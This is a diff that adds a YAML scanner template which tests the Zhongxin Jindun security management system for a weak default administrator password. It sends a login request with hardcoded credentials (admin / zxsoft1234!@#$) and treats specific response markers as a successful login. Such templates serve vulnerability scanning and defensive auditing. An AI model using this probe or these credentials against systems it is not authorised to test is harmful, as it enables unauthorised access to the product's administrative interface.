@@ -1,0 +1,32 @@
+id: poc-yaml-zhongxin-jindun-weak-pass
+info:
+  name: 中信金盾安全管理系统弱口令漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password
+  metadata:
+    finger: 中信金盾
+    osprey-id: vb_2021_0026
+http:
+  - raw:
+      - |
+        POST /?q=common/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Cookie: check_code=wnd3
+
+        name=admin&password=zxsoft1234!@#$&checkcode=wnd3&doLoginSubmit=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "1"
+      - type: word
+        part: header
+        words:
+          - "ZXSOFT_JDIS_USR_NAME=delete"
